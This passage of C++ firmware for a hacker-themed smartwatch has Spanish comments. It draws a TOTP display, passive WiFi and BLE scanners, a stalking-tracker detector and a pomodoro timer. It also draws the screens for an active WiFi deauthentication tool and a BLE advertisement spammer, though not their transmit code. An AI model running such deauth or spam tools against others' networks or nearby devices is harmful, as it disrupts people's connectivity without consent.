  char hdr[16]; snprintf(hdr, sizeof(hdr), "%d/%d", totpSel + 1, TOTP_COUNT);
  title(R - 6, 5, hdr, true);
  display.setFont(&Spleen6x12);
  centerText(100, 26, TOTP_ACCOUNTS[totpSel].name);

  uint64_t now = unixUTC();
  uint32_t code = totp_at(TOTP_ACCOUNTS[totpSel].secret, now, 30, 6);
  int secsLeft = 30 - (int)(now % 30);

  // código principal: 6 dígitos a tamaño héroe
  panel(L, 40, R, 104);
  char cc[8]; snprintf(cc, sizeof(cc), "%06u", (unsigned)code);
  display.setFont(&Spleen32x64);
  centerText(100, 92, cc);

  // barra de validez (se vacía al acercarse el cambio)
  panel(L, 112, R, 150);
  title(L + 6, 112, "valido");
  char s[8]; snprintf(s, sizeof(s), "%2ds", secsLeft);
  title(R - 6, 112, s, true);
  const int16_t bx0 = L + 8, bx1 = R - 8, by = 132;
  int16_t fullW = (bx1 - bx0) * secsLeft / 30;
  display.drawRect(bx0, by, bx1 - bx0, 8, fg());
  display.fillRect(bx0, by, fullW, 8, fg());

  // próximo código, para ir preparado
  uint32_t next = totp_at(TOTP_ACCOUNTS[totpSel].secret, now + 30, 30, 6);
  panel(L, 158, R, 196);
  title(L + 6, 158, "siguiente");
  char nx[12]; snprintf(nx, sizeof(nx), "%06u", (unsigned)next);
  display.setFont(&Spleen12x24);
  textRight(R - 8, 186, nx);
  display.setFont(&Spleen5x8);
  display.setCursor(L + 8, 182);
  display.print("UP/DOWN");
  display.setCursor(L + 8, 192);
  display.print("cambia cuenta");
}

// ===========================================================================
//  App: escáner WiFi (pasivo)
// ===========================================================================
void WatchyHackchyOS::drawWiFi() {
  panel(L, 5, R, 32);
  title(L + 6, 5, "wifi");
  char hdr[16];
  if (wifiView) strcpy(hdr, "canales");
  else          snprintf(hdr, sizeof(hdr), "%d redes", wifiCount);
  title(R - 6, 5, hdr, true);

  if (wifiCount == 0) {
    display.setFont(&Spleen6x12);
    centerText(100, 110, "sin resultados");
    centerText(100, 126, "re-abre para escanear");
    return;
  }

  // ----- vista de ocupación de canales -----
  if (wifiView) {
    uint8_t cnt[14] = {0};
    for (int i = 0; i < wifiCount; i++)
      if (wifiChan[i] >= 1 && wifiChan[i] <= 13) cnt[wifiChan[i]]++;
    uint8_t peak = 1;
    for (int c = 1; c <= 13; c++) if (cnt[c] > peak) peak = cnt[c];

    panel(L, 38, R, 150);
    title(L + 6, 38, "redes / canal");
    const int16_t x0 = L + 10, bw = 11, gap = 3, yBase = 138, maxH = 86;
    for (int c = 1; c <= 13; c++) {
      int16_t bx = x0 + (c - 1) * (bw + gap);
      int16_t bh = cnt[c] ? 6 + (maxH - 6) * cnt[c] / peak : 2;
      if (cnt[c]) display.fillRect(bx, yBase - bh, bw, bh, fg());
      else        display.drawFastHLine(bx, yBase, bw, fg());
      display.setFont(&Spleen5x8);
      char l[3]; snprintf(l, sizeof(l), "%d", c);
      display.setCursor(bx + (c < 10 ? 3 : 1), yBase + 9);
      display.print(l);
      if (cnt[c]) { char n[3]; snprintf(n, sizeof(n), "%d", cnt[c]);
        display.setCursor(bx + (bw - textWidth(n)) / 2, yBase - bh - 2); display.print(n); }
    }
    display.setFont(&Spleen5x8);
    centerText(100, 170, "1 / 6 / 11 no se solapan");
    centerText(100, 194, "MENU lista   BACK salir");
    return;
  }

  // ----- vista de lista (seleccionable) -----
  const int16_t rowH = 23, y0 = 36;
  const int visible = 4;
  if (wifiSel < wifiTop) wifiTop = wifiSel;
  if (wifiSel > wifiTop + visible - 1) wifiTop = wifiSel - visible + 1;

  for (int r = 0; r < visible && wifiTop + r < wifiCount; r++) {
    int i = wifiTop + r;
    int16_t y = y0 + r * rowH;
    bool sel = (i == wifiSel);
    panel(L, y, R, y + rowH - 3);
    if (sel) display.fillRect(L + 3, y + 3, 3, rowH - 9, fg());
    signalBars(L + 10, y + 3, wifiRSSI[i]);
    lockIcon(R - 13, y + 5, !wifiEnc[i]);
    display.setFont(&Spleen6x12);
    display.setCursor(L + 28, y + 10);
    char ssid[16]; strncpy(ssid, wifiSSID[i], 12); ssid[12] = 0;
    display.print(ssid);
    char tag[8]; securityTag(wifiAuth[i], tag);
    display.setFont(&Spleen5x8);
    char meta[20]; snprintf(meta, sizeof(meta), "ch%02d  %ddBm  %s", wifiChan[i], wifiRSSI[i], tag);
    display.setCursor(L + 28, y + 19);
    display.print(meta);
  }

  // ----- detalle de la red seleccionada -----
  panel(L, 132, R, 178);
  title(L + 6, 132, "detalle");
  const uint8_t *m = wifiBSSID[wifiSel];
  char bss[20];
  snprintf(bss, sizeof(bss), "%02X:%02X:%02X:%02X:%02X:%02X", m[0], m[1], m[2], m[3], m[4], m[5]);
  display.setFont(&Spleen6x12);
  display.setCursor(L + 8, 150);
  display.print(bss);
  char tag[8]; securityTag(wifiAuth[wifiSel], tag);
  display.setFont(&Spleen5x8);
  display.setCursor(L + 8, 164);
  display.print(ouiVendor(m));
  display.print("  /  ");
  display.print(tag);
  display.print("  /  ch ");
  char cc[4]; snprintf(cc, sizeof(cc), "%d", wifiChan[wifiSel]);
  display.print(cc);

  display.setFont(&Spleen5x8);
  centerText(100, 194, "UP/DOWN red  MENU canales  BACK salir");
}

// ===========================================================================
//  App: monitor pasivo de tramas 802.11 (promiscuo, no inyecta nada)
// ===========================================================================
void WatchyHackchyOS::drawMonitor() {
  panel(L, 5, R, 32);
  title(L + 6, 5, "monitor");
  char hdr[16];
  if (monHop) snprintf(hdr, sizeof(hdr), "hop");
  else        snprintf(hdr, sizeof(hdr), "ch%02d", monChan);
  title(R - 6, 5, hdr, true);
  display.setFont(&Spleen5x8);
  centerText(100, 24, "escucha pasiva  ·  no transmite");

  // aviso de tormenta de deauth
  if (monAlert) {
    panel(L, 36, R, 60);
    display.fillRect(L + 2, 38, R - L - 4, 21, fg());
    display.setTextColor(bg());
    display.setFont(&Spleen6x12);
    centerText(100, 53, "!! DEAUTH DETECTADO !!");
    display.setTextColor(fg());
  } else {
    panel(L, 36, R, 60);
    title(L + 6, 36, "estado");
    display.setFont(&Spleen6x12);
    textRight(R - 8, 54, "tranquilo");
    display.setFont(&Spleen5x8);
    display.setCursor(L + 8, 52);
    char tt[20]; snprintf(tt, sizeof(tt), "%lu tramas/s", (unsigned long)monTotal);
    display.print(tt);
  }

  // contadores por tipo, con barra proporcional
  struct { const char *name; uint32_t v; } rows[] = {
    {"beacon",  monBeacon},
    {"probe",   monProbe},
    {"data",    monData},
    {"deauth",  monDeauth},
    {"otras",   monOther},
  };
  uint32_t peak = 1;
  for (auto &r : rows) if (r.v > peak) peak = r.v;

  panel(L, 64, R, 196);
  const int16_t rh = 24, y0 = 74, bx0 = L + 56, bx1 = R - 30;
  for (int i = 0; i < 5; i++) {
    int16_t y = y0 + i * rh;
    display.setFont(&Spleen6x12);
    display.setCursor(L + 8, y + 4);
    display.print(rows[i].name);
    int16_t w = (bx1 - bx0) * rows[i].v / peak;
    display.drawRect(bx0, y - 5, bx1 - bx0, 10, fg());
    if (i == 3 && rows[i].v)          // deauth resaltado
      for (int16_t xx = bx0; xx < bx0 + w; xx += 2) display.drawFastVLine(xx, y - 5, 10, fg());
    else
      display.fillRect(bx0, y - 5, w, 10, fg());
    char n[12]; snprintf(n, sizeof(n), "%lu", (unsigned long)rows[i].v);
    textRight(R - 8, y + 4, n);
  }
}

// ===========================================================================
//  App: test de deauth (activo — SOLO tus propias redes/dispositivos)
// ===========================================================================
void WatchyHackchyOS::drawDeauth() {
  panel(L, 5, R, 32);
  title(L + 6, 5, "deauth");
  title(R - 6, 5, deauthRunning ? "TX" : "test", true, deauthRunning);
  display.setFont(&Spleen5x8);
  centerText(100, 26, "solo tu propia red");

  if (wifiCount == 0) {
    display.setFont(&Spleen6x12);
    centerText(100, 100, "primero escanea redes");
    centerText(100, 116, "(abre la app wifi)");
    display.setFont(&Spleen5x8);
    centerText(100, 194, "BACK salir");
    return;
  }

  // objetivo elegido (de la lista de la app wifi)
  panel(L, 38, R, 96);
  title(L + 6, 38, "objetivo");
  char hdr[8]; snprintf(hdr, sizeof(hdr), "%d/%d", deauthSel + 1, wifiCount);
  title(R - 6, 38, hdr, true);
  display.setFont(&Spleen6x12);
  char ssid[16]; strncpy(ssid, wifiSSID[deauthSel], 15); ssid[15] = 0;
  centerText(100, 60, ssid);
  display.setFont(&Spleen5x8);
  const uint8_t *m = wifiBSSID[deauthSel];
  char meta[32];
  snprintf(meta, sizeof(meta), "%02X:%02X:%02X:%02X:%02X:%02X  ch%02d",
           m[0], m[1], m[2], m[3], m[4], m[5], wifiChan[deauthSel]);
  centerText(100, 80, meta);

  // estado: armado/transmitiendo o en reposo
  panel(L, 102, R, 178);
  if (deauthRunning) {
    display.fillRect(L + 2, 104, R - L - 4, 23, fg());
    display.setTextColor(bg());
    display.setFont(&Spleen6x12);
    centerText(100, 119, "!! TRANSMITIENDO !!");
    display.setTextColor(fg());
    display.setFont(&Spleen5x8);
    char st[28];
    snprintf(st, sizeof(st), "%lu tramas  corte en %lds",
             (unsigned long)deauthSent, (long)deauthLeft);
    centerText(100, 140, st);
    if (deauthSent == 0) {                   // diagnóstico: por qué no sale nada
      char err[28];
      snprintf(err, sizeof(err), "tx:0x%lx chSet:0x%lx",
               (long)deauthLastErr, (long)deauthChanErr);
      centerText(100, 152, err);
      char chn[28];
      snprintf(chn, sizeof(chn), "ch %d/%d  wifi.status:%ld",
               wifiChan[deauthSel], deauthRealChan, (long)deauthWifiStatus);
      centerText(100, 164, chn);
    }
  } else {
    title(L + 6, 102, "estado");
    display.setFont(&Spleen6x12);
    textRight(R - 8, 120, "listo");
    display.setFont(&Spleen5x8);
    char st[24]; snprintf(st, sizeof(st), "autocorte: %ds", DEAUTH_MAX_SECONDS);
    centerText(100, 140, st);
  }

  display.setFont(&Spleen5x8);
  centerText(100, 184, "UP/DOWN red   MENU on/off");
  centerText(100, 194, "BACK sale (corta ya)");
}

// ===========================================================================
//  App: spam BLE (activo — sin objetivo, afecta a cualquiera que esté cerca)
// ===========================================================================
void WatchyHackchyOS::drawBleSpam() {
  panel(L, 5, R, 32);
  title(L + 6, 5, "ble spam");
  title(R - 6, 5, bleSpamRunning ? "TX" : "test", true, bleSpamRunning);
  display.setFont(&Spleen5x8);
  centerText(100, 26, "sin objetivo: afecta a cualquiera");

  // plantilla elegida
  panel(L, 38, R, 96);
  title(L + 6, 38, "plantilla");
  char hdr[8]; snprintf(hdr, sizeof(hdr), "%d/%d", bleSpamMode + 1, BLESPAM_COUNT + 1);
  title(R - 6, 38, hdr, true);
  display.setFont(&Spleen6x12);
  centerText(100, 70, BLESPAM_NAMES[bleSpamMode]);
  display.setFont(&Spleen5x8);
  centerText(100, 88, bleSpamMode >= BLESPAM_COUNT
                       ? "ronda las tres cada rafaga" : "anuncio BLE falso");

  // estado: armado/transmitiendo o en reposo
  panel(L, 102, R, 170);
  if (bleSpamRunning) {
    display.fillRect(L + 2, 104, R - L - 4, 23, fg());
    display.setTextColor(bg());
    display.setFont(&Spleen6x12);
    centerText(100, 119, "!! TRANSMITIENDO !!");
    display.setTextColor(fg());
    display.setFont(&Spleen5x8);
    char st[28];
    snprintf(st, sizeof(st), "%lu anuncios  corte en %lds",
             (unsigned long)bleSpamSent, (long)bleSpamLeft);
    centerText(100, 140, st);
  } else {
    title(L + 6, 102, "estado");
    display.setFont(&Spleen6x12);
    textRight(R - 8, 120, "listo");
    display.setFont(&Spleen5x8);
    char st[24]; snprintf(st, sizeof(st), "autocorte: %ds", BLESPAM_MAX_SECONDS);
    centerText(100, 140, st);
  }

  display.setFont(&Spleen5x8);
  centerText(100, 184, "UP/DOWN plantilla  MENU on/off");
  centerText(100, 194, "BACK sale (corta ya)");
}

void WatchyHackchyOS::drawPomodoro() {
  panel(L, 5, R, 32);
  title(L + 6, 5, "pomo");
  title(R - 6, 5, pomoRun ? "ON" : "PAUSA", true, pomoRun);
  display.setFont(&Spleen6x12);
  centerText(100, 26, pomoBreak ? "// descanso" : "// foco");

  // cuenta atrás grande
  panel(L, 40, R, 116);
  int mm = pomoLeft / 60, ss = pomoLeft % 60;
  char t[12]; snprintf(t, sizeof(t), "%02d:%02d", mm, ss);
  display.setFont(&Spleen32x64);
  centerText(100, 92, t);
  // tomates completados
  display.setFont(&Spleen5x8);
  char c[16]; snprintf(c, sizeof(c), "ciclos: %d", pomoCycles);
  centerText(100, 110, c);

  // progreso de la fase
  int total = (pomoBreak ? POMO_BREAK_MIN : POMO_WORK_MIN) * 60;
  int done = total - pomoLeft;
  const int16_t bx0 = L + 8, bx1 = R - 8, by = 122;
  display.drawRect(bx0, by, bx1 - bx0, 6, fg());
  display.fillRect(bx0, by, (bx1 - bx0) * done / total, 6, fg());

  // despertador
  panel(L, 136, R, 196);
  title(L + 6, 136, "despertador");
  title(R - 6, 136, almOn ? "ON" : "OFF", true, almOn);
  // campana
  int16_t bellX = L + 12, bellY = 168;
  display.fillRect(bellX - 4, bellY - 8, 8, 7, fg());
  display.drawFastHLine(bellX - 6, bellY - 1, 13, fg());
  display.drawPixel(bellX, bellY + 2, fg());
  if (!almOn) display.drawLine(bellX - 8, bellY - 10, bellX + 8, bellY + 4, bg());
  char a[12]; snprintf(a, sizeof(a), "%02d:%02d", almH, almM);
  display.setFont(&Spleen12x24);
  display.setCursor(L + 28, bellY + 8);
  display.print(a);
  display.setFont(&Spleen5x8);
  textRight(R - 8, 162, "MENU play/pause");
  textRight(R - 8, 174, "UP min  DOWN hora");
  textRight(R - 8, 186, "BACK(largo) on/off");
}

// ===========================================================================
//  App: Bluetooth LE (escaneo pasivo + detector de trackers)
// ===========================================================================
#ifndef HACKCHYOS_SIM
// Clasifica un anuncio BLE: ¿es un tracker conocido? Heurística por
// manufacturer data / UUIDs de servicio. No es exhaustiva ni infalible.
static uint8_t bleClassify(BLEAdvertisedDevice &d) {
  // Apple "offline finding" (AirTag y accesorios Find My): company id 0x004C,
  // byte de tipo 0x12. Puede ser también un iPhone retransmitiendo la red Find My.
  if (d.haveManufacturerData()) {
    auto md = d.getManufacturerData();                // String (core 3.x) o std::string
    if (md.length() >= 3 && (uint8_t)md[0] == 0x4C && (uint8_t)md[1] == 0x00 &&
        (uint8_t)md[2] == 0x12)
      return TRK_APPLE;
  }
  BLEUUID SAMSUNG((uint16_t)0xFD5A);   // Samsung SmartTag
  BLEUUID TILE_A((uint16_t)0xFEED);    // Tile
  BLEUUID TILE_B((uint16_t)0xFEEC);    // Tile
  BLEUUID FINDMY((uint16_t)0xFD44);    // Apple Find My accessory
  for (int i = 0; i < (int)d.getServiceDataCount(); i++) {
    BLEUUID u = d.getServiceDataUUID(i);
    if (u.equals(SAMSUNG))                     return TRK_SAMSUNG;
    if (u.equals(TILE_A) || u.equals(TILE_B))  return TRK_TILE;
    if (u.equals(FINDMY))                      return TRK_FINDMY;
  }
  for (int i = 0; i < (int)d.getServiceUUIDCount(); i++) {
    BLEUUID u = d.getServiceUUID(i);
    if (u.equals(SAMSUNG))                     return TRK_SAMSUNG;
    if (u.equals(TILE_A) || u.equals(TILE_B))  return TRK_TILE;
    if (u.equals(FINDMY))                      return TRK_FINDMY;
  }
  return TRK_NONE;
}

// Anota un tracker en la tabla de seguimiento (una entrada por identidad/MAC).
static void trackerSeen(const uint8_t *addr, uint8_t kind, uint64_t now) {
  for (int i = 0; i < trkCount; i++)
    if (memcmp(trkAddr[i], addr, 6) == 0) {
      if (now > trkLast[i]) trkSeen[i]++;    // una sesión nueva lo ha vuelto a ver
      trkLast[i] = now;
      trkKind[i] = kind;
      return;
    }
  if (trkCount < 8) {                        // identidad nueva
    memcpy(trkAddr[trkCount], addr, 6);
    trkKind[trkCount]  = kind;
    trkSeen[trkCount]  = 1;
    trkFirst[trkCount] = now;
    trkLast[trkCount]  = now;
    trkCount++;
  }
}

// ¿Hay un tracker que lleva un rato siguiéndonos? Poda los viejos y marca el peor.
static void evalFollow(uint64_t now) {
  bleFollowAlert = false;
  bleWorstTrk = -1;
  // olvida lo que no se ve desde hace más de 30 min (libera huecos)
  for (int i = 0; i < trkCount; ) {
    if (now - trkLast[i] > 1800) {
      for (int j = i; j < trkCount - 1; j++) {
        memcpy(trkAddr[j], trkAddr[j + 1], 6);
        trkKind[j] = trkKind[j + 1]; trkSeen[j] = trkSeen[j + 1];
        trkFirst[j] = trkFirst[j + 1]; trkLast[j] = trkLast[j + 1];
      }
      trkCount--;
    } else i++;
  }
  uint64_t bestSpan = 0;
  for (int i = 0; i < trkCount; i++) {
    uint64_t span = trkLast[i] - trkFirst[i];
    bool present = (now - trkLast[i] <= 10);       // visto en este mismo escaneo
    // alerta: mismo tag en >=3 sesiones y presente durante >=10 min seguidos
    if (present && trkSeen[i] >= 3 && span >= 600 && span >= bestSpan) {
      bestSpan = span; bleWorstTrk = i; bleFollowAlert = true;
    }
  }
}

void WatchyHackchyOS::bleScan() {
  WiFi.mode(WIFI_OFF);                    // libera la radio para BLE (coexistencia)
  BLEDevice::init("");
  BLEScan *scan = BLEDevice::getScan();
  scan->setActiveScan(false);            // PASIVO: solo escucha, no pide scan-response
  scan->setInterval(100);
  scan->setWindow(99);
#if defined(ESP_ARDUINO_VERSION_MAJOR) && ESP_ARDUINO_VERSION_MAJOR >= 3
  BLEScanResults *res = scan->start(5, false);   // core 3.x: start() devuelve puntero
#else
  BLEScanResults resVal = scan->start(5, false); // core 2.x: start() devuelve por valor
  BLEScanResults *res = &resVal;
#endif
  int n = res->getCount();
  bleCount = n > 16 ? 16 : n;
  uint64_t now = unixUTC();
  for (int i = 0; i < bleCount; i++) {
    BLEAdvertisedDevice d = res->getDevice(i);
    auto nm = d.getName();
    if (nm.length() == 0) strcpy(bleName[i], "<sin nombre>");
    else { strncpy(bleName[i], nm.c_str(), 19); bleName[i][19] = 0; }
    bleRSSI[i] = d.getRSSI();
    // MAC: parseamos "aa:bb:cc:dd:ee:ff" (sirve igual con String o std::string)
    unsigned a[6] = {0};
    sscanf(d.getAddress().toString().c_str(), "%x:%x:%x:%x:%x:%x",
           &a[0], &a[1], &a[2], &a[3], &a[4], &a[5]);
    for (int k = 0; k < 6; k++) bleAddr[i][k] = (uint8_t)a[k];
    bleCID[i] = 0xFFFF;
    if (d.haveManufacturerData()) {
      auto md = d.getManufacturerData();
      if (md.length() >= 2) bleCID[i] = (uint8_t)md[0] | ((uint8_t)md[1] << 8);
    }
    bleKind[i] = bleClassify(d);
    if (bleKind[i]) trackerSeen(bleAddr[i], bleKind[i], now);
  }
  scan->clearResults();
  evalFollow(now);
  BLEDevice::deinit(false);              // libera el controlador hasta el próximo escaneo
}
#endif  // !HACKCHYOS_SIM

const char *WatchyHackchyOS::bleVendor(uint16_t cid) {
  switch (cid) {
    case 0x004C: return "Apple";
    case 0x0006: return "Microsoft";
    case 0x0075: return "Samsung";
    case 0x00E0: return "Google";
    case 0x0059: return "Nordic";
    case 0x02E5: return "Espressif";
    case 0x0087: return "Garmin";
    case 0x009E: return "Bose";
    case 0x0157: return "Huami";
    case 0xFFFF: return "-";
    default: { static char hx[8]; snprintf(hx, sizeof(hx), "%04X", cid); return hx; }
  }
}

const char *WatchyHackchyOS::trkLabel(uint8_t kind) {
  switch (kind) {
    case TRK_APPLE:   return "Apple Find My";
    case TRK_SAMSUNG: return "SmartTag";
    case TRK_TILE:    return "Tile";
    case TRK_FINDMY:  return "Find My";
    default:          return "";
  }
}

void WatchyHackchyOS::drawBluetooth() {
  panel(L, 5, R, 32);
  title(L + 6, 5, "ble");
  char hdr[16];
  if      (bleView == 1) snprintf(hdr, sizeof(hdr), "trackers");
  else if (bleView == 2) snprintf(hdr, sizeof(hdr), "densidad");
  else                   snprintf(hdr, sizeof(hdr), "%d disp", bleCount);
  title(R - 6, 5, hdr, true);

  // ----- vista de trackers -----
  if (bleView == 1) {
    if (bleFollowAlert) {
      panel(L, 36, R, 62);
      display.fillRect(L + 2, 38, R - L - 4, 23, fg());
      display.setTextColor(bg());
      display.setFont(&Spleen6x12);
      centerText(100, 54, "!! TE ESTAN SIGUIENDO !!");
      display.setTextColor(fg());
    } else {
      panel(L, 36, R, 62);
      display.setFont(&Spleen6x12);
      centerText(100, 52, trkCount ? "trackers a la vista" : "sin trackers cerca");
    }

    panel(L, 66, R, 172);
    const int16_t rh = 26, y0 = 80;
    int shown = trkCount < 4 ? trkCount : 4;
    // solo caben 4 filas: si hay un tracker marcado como "te están siguiendo"
    // (bleWorstTrk), que vaya primero para que nunca quede fuera de la vista
    int order[4];
    {
      int oi = 0;
      if (bleWorstTrk >= 0 && bleWorstTrk < trkCount) order[oi++] = bleWorstTrk;
      for (int i = 0; i < trkCount && oi < shown; i++)
        if (i != bleWorstTrk) order[oi++] = i;
    }
    for (int r = 0; r < shown; r++) {
      int i = order[r];
      int16_t y = y0 + r * rh;
      if (i == bleWorstTrk) display.fillRect(L + 4, y - 7, 3, 18, fg());
      display.setFont(&Spleen6x12);
      display.setCursor(L + 12, y);
      display.print(trkLabel(trkKind[i]));
      long mins = (long)((trkLast[i] - trkFirst[i]) / 60);
      char info[20]; snprintf(info, sizeof(info), "%ldmin x%u", mins, (unsigned)trkSeen[i]);
      display.setFont(&Spleen5x8);
      textRight(R - 8, y, info);
      char mac[20];
      snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
               trkAddr[i][0], trkAddr[i][1], trkAddr[i][2],
               trkAddr[i][3], trkAddr[i][4], trkAddr[i][5]);
      display.setCursor(L + 12, y + 9);
      display.print(mac);
    }
    display.setFont(&Spleen5x8);
    centerText(100, 184, "los tags rotan su MAC ~15min");
    centerText(100, 194, "MENU vistas   BACK salir");
    return;
  }

  // ----- vista de densidad (buckets por RSSI) -----
  if (bleView == 2) {
    struct { const char *name; int8_t lo, hi; uint16_t v; } b[] = {
      {"cerca",     -60,    0, 0},
      {"media",     -75,  -60, 0},
      {"lejos",     -90,  -75, 0},
      {"muy lejos", -128, -90, 0},
    };
    int trk = 0;
    for (int i = 0; i < bleCount; i++) {
      for (auto &r : b) if (bleRSSI[i] > r.lo && bleRSSI[i] <= r.hi) { r.v++; break; }
      if (bleKind[i]) trk++;
    }
    panel(L, 36, R, 60);
    title(L + 6, 36, "resumen");
    display.setFont(&Spleen6x12);
    char rs[24]; snprintf(rs, sizeof(rs), "%d disp  /  %d tags", bleCount, trk);
    display.setCursor(L + 8, 54);
    display.print(rs);

    panel(L, 64, R, 196);
    uint16_t peak = 1;
    for (auto &r : b) if (r.v > peak) peak = r.v;
    const int16_t rh = 30, y0 = 82, bx0 = L + 72, bx1 = R - 28;
    for (int i = 0; i < 4; i++) {
      int16_t y = y0 + i * rh;
      display.setFont(&Spleen6x12);
      display.setCursor(L + 8, y + 4);
      display.print(b[i].name);
      int16_t w = (bx1 - bx0) * b[i].v / peak;
      display.drawRect(bx0, y - 6, bx1 - bx0, 12, fg());
      display.fillRect(bx0, y - 6, w, 12, fg());
      char n[8]; snprintf(n, sizeof(n), "%u", (unsigned)b[i].v);
      textRight(R - 8, y + 4, n);
    }
    return;
  }

  // ----- vista de lista -----
  if (bleCount == 0) {
    display.setFont(&Spleen6x12);
    centerText(100, 108, "sin dispositivos");
    centerText(100, 124, "re-abre para escanear");
    display.setFont(&Spleen5x8);
    centerText(100, 194, "MENU vistas   BACK salir");
    return;
  }

  const int16_t rowH = 23, y0 = 36;
  const int visible = 4;
  if (bleSel < bleTop)                bleTop = bleSel;
  if (bleSel > bleTop + visible - 1)  bleTop = bleSel - visible + 1;
  for (int r = 0; r < visible && bleTop + r < bleCount; r++) {
    int i = bleTop + r;
    int16_t y = y0 + r * rowH;
    bool sel = (i == bleSel);
    panel(L, y, R, y + rowH - 3);
    if (sel) display.fillRect(L + 3, y + 3, 3, rowH - 9, fg());
    signalBars(L + 10, y + 3, bleRSSI[i]);
    display.setFont(&Spleen6x12);
    display.setCursor(L + 28, y + 10);
    char nm[16]; strncpy(nm, bleName[i], 12); nm[12] = 0;
    display.print(nm);
    if (bleKind[i]) { display.setFont(&Spleen5x8); textRight(R - 6, y + 9, "[tag]"); }
    display.setFont(&Spleen5x8);
    char meta[24]; snprintf(meta, sizeof(meta), "%s  %ddBm", bleVendor(bleCID[i]), bleRSSI[i]);
    display.setCursor(L + 28, y + 19);
    display.print(meta);
  }

  // ----- detalle del seleccionado -----
  panel(L, 132, R, 178);
  title(L + 6, 132, "detalle");
  const uint8_t *m = bleAddr[bleSel];
  char mac[20];
  snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X", m[0], m[1], m[2], m[3], m[4], m[5]);
  display.setFont(&Spleen6x12);
  display.setCursor(L + 8, 150);
  display.print(mac);
  display.setFont(&Spleen5x8);
  display.setCursor(L + 8, 164);
  display.print(bleVendor(bleCID[bleSel]));
  if (bleKind[bleSel]) { display.print("  /  "); display.print(trkLabel(bleKind[bleSel])); }

  display.setFont(&Spleen5x8);
  centerText(100, 194, "UP/DOWN  MENU vistas  BACK salir");
}

// ===========================================================================
//  Helpers nuevos
// ===========================================================================
void WatchyHackchyOS::centerText(int16_t cx, int16_t baseline, const char *s) {
  display.setCursor(cx - textWidth(s) / 2, baseline);
  display.print(s);
}

void WatchyHackchyOS::signalBars(int16_t x, int16_t y, int8_t rssi) {
  // 4 barras de 3 px, altura 4/7/10/13; umbrales habituales de RSSI
  int level = rssi >= -55 ? 4 : rssi >= -67 ? 3 : rssi >= -78 ? 2 : rssi >= -88 ? 1 : 0;
  for (int b = 0; b < 4; b++) {
    int16_t h = 4 + b * 3, bx = x + b * 4, by = y + 13 - h;
    if (b < level) display.fillRect(bx, by, 3, h, fg());
    else           display.drawFastVLine(bx + 1, y + 12, 1, fg());
  }
}

void WatchyHackchyOS::securityTag(uint8_t auth, char *out) {
  // valores de wifi_auth_mode_t (esp-idf)
  switch (auth) {
    case 0:  strcpy(out, "ABRE"); break;   // OPEN
    case 1:  strcpy(out, "WEP");  break;
    case 2:  strcpy(out, "WPA");  break;
    case 3:  strcpy(out, "WPA2"); break;   // WPA2_PSK
    case 4:  strcpy(out, "WPA/2");break;   // WPA_WPA2_PSK
    case 5:  strcpy(out, "EAP");  break;   // ENTERPRISE
    case 6:  strcpy(out, "WPA3"); break;   // WPA3_PSK
    case 7:  strcpy(out, "WPA23");break;   // WPA2_WPA3_PSK
    case 9:  strcpy(out, "OWE");  break;
    default: strcpy(out, "?");    break;
  }
}

// Fabricante a partir del OUI (primeros 3 bytes de la MAC). Tabla reducida;
// si no está, devuelve el OUI en hexadecimal.
const char *WatchyHackchyOS::ouiVendor(const uint8_t *mac) {
  struct Oui { uint8_t a, b, c; const char *name; };
  static const Oui T[] = {
    {0x3C,0x5A,0xB4,"Google"},   {0x00,0x1A,0x11,"Google"},
    {0xF0,0x9F,0xC2,"Ubiquiti"}, {0x00,0x1D,0x0F,"TP-Link"},
    {0x50,0xC7,0xBF,"TP-Link"},  {0xD8,0x0D,0x17,"TP-Link"},
    {0x24,0x6F,0x28,"Espressif"},{0x30,0xAE,0xA4,"Espressif"},
    {0xA4,0xCF,0x12,"Espressif"},{0x3C,0x07,0x54,"Apple"},
    {0xF0,0x18,0x98,"Apple"},    {0x00,0x1C,0xB3,"Apple"},
    {0x5C,0x0A,0x5B,"Samsung"},  {0x34,0x23,0x87,"Samsung"},
    {0x28,0x6C,0x07,"Xiaomi"},   {0x64,0x09,0x80,"Xiaomi"},
    {0x00,0xE0,0xFC,"Huawei"},   {0x28,0x6E,0xD4,"Huawei"},
    {0x3C,0xA9,0xF4,"Intel"},    {0x7C,0x7A,0x91,"Intel"},
    {0x00,0x40,0x96,"Cisco"},    {0xE4,0x3E,0xD7,"Movistar"},
    {0xF8,0x8A,0x3C,"Movistar"}, {0x00,0x1E,0x10,"Huawei"},
  };
  for (auto &o : T)
    if (o.a == mac[0] && o.b == mac[1] && o.c == mac[2]) return o.name;
  static char hex[10];
  snprintf(hex, sizeof(hex), "%02X%02X%02X", mac[0], mac[1], mac[2]);
  return hex;
}

void WatchyHackchyOS::lockIcon(int16_t x, int16_t y, bool open) {
  display.drawRect(x, y + 4, 8, 6, fg());        // cuerpo
  if (open) {                                     // red abierta: candado abierto
    display.drawFastVLine(x + 1, y + 1, 3, fg());
    display.drawFastHLine(x + 1, y, 4, fg());
    display.drawFastVLine(x + 5, y + 1, 1, fg());
  } else {                                        // protegida: candado cerrado
    display.drawFastVLine(x + 1, y + 1, 3, fg());
    display.drawFastVLine(x + 6, y + 1, 3, fg());
    display.drawFastHLine(x + 2, y, 4, fg());
  }
  display.drawPixel(x + 4, y + 6, bg());
}
// ---------------------------------------------------------------------------
//  Registro de pasos por hora
// ---------------------------------------------------------------------------
void WatchyHackchyOS::updateStepLog(uint32_t steps) {
  if (currentTime.Day != htLogDay) {                 // día nuevo
    htYesterday = (htLogDay == 0) ? 0 : steps;
    sensor.resetStepCounter();
    memset(htHourSteps, 0, sizeof(htHourSteps));
    htLastCount = 0;
    htLogDay = currentTime.Day;
    return;
  }
  uint32_t delta = (steps >= htLastCount) ? steps - htLastCount : steps;
  uint32_t slot  = htHourSteps[currentTime.Hour] + delta;
  htHourSteps[currentTime.Hour] = slot > 0xFFFF ? 0xFFFF : slot;
  htLastCount = steps;
}

// ---------------------------------------------------------------------------
//  Panel del reloj
// ---------------------------------------------------------------------------
void WatchyHackchyOS::drawClockPanel() {
  panel(L, A_TOP, R, A_BOT);

  // título izquierdo: fecha
  uint8_t wd = currentTime.Wday  <= 7  ? currentTime.Wday  : 0;
  uint8_t mo = currentTime.Month <= 12 ? currentTime.Month : 0;
  char buf[24];
  snprintf(buf, sizeof(buf), "%s %02d %s", DIAS[wd], currentTime.Day, MESES[mo]);
  title(L + 6, A_TOP, buf);

  // título derecho: batería (% + icono)
  float vbat = getBatteryVoltage();
